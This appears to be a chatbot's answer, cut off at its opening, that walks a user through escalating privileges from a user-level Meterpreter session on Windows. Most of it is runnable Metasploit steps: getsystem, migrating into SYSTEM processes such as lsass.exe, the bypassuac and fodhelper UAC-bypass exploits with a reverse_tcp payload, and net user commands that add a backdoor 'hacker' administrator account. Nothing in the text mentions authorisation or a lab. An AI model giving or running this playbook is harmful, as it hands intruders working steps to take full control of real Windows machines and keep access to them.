**Administrator permission error** because the Meterpreter session is running with **regular user privileges**, meaning you don't have the necessary rights to create a new user or elevate privileges. You need to **escalate privileges** first. Here are some ways to do that:

---

## **1. Check Current Privileges**
First, check if you are running as **SYSTEM or Administrator** in Meterpreter:
```
getuid
```
If it returns a standard user (not SYSTEM or Administrator), you need to escalate.

---

## **2. Try Automatic Privilege Escalation**
Run:
```
use post/windows/escalate/getsystem
run
```
If successful, it should elevate you to **NT AUTHORITY\SYSTEM**.

---

## **3. Migrate to a High-Privilege Process**
If `getsystem` fails, try migrating into a process with **higher privileges**:
1. List running processes:
   ```
   ps
   ```
2. Find a process owned by **NT AUTHORITY\SYSTEM** (e.g., `winlogon.exe` or `lsass.exe`).
3. Migrate into it:
   ```
   migrate <PID>
   ```
   Example:
   ```
   migrate 1234
   ```
4. Check if you now have SYSTEM privileges:
   ```
   getuid
   ```

---

## **4. Manually Exploit Privilege Escalation**
If the above methods don’t work, use a **local privilege escalation exploit**.  
Try running:
```
use exploit/windows/local/bypassuac
set payload windows/meterpreter/reverse_tcp
set SESSION 1
exploit
```
If that doesn't work, search for other local privilege escalation exploits:
```
search type:exploit platform:windows local
```
Pick one that fits your OS and run it.

---

## **5. Try Running a UAC Bypass**
If you have admin privileges but **UAC (User Account Control) is blocking** the command, try:
```
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
exploit
```
This works by abusing `fodhelper.exe` to bypass UAC.

---

## **6. Run Commands as SYSTEM**
If you get SYSTEM privileges, you can execute system commands directly:
```
execute -f cmd.exe -i -H
```
Then, try:
```
net user hacker P@ssw0rd /add
net localgroup administrators hacker /add
```
- If `getsystem` or `bypassuac` fails, the system might be patched. Try finding an **exploit for your OS version**.
- Use `sysinfo` to check the Windows version, then search for privilege escalation exploits.
- If UAC is enabled and blocking commands, bypass it using `bypassuac_fodhelper` or another method.
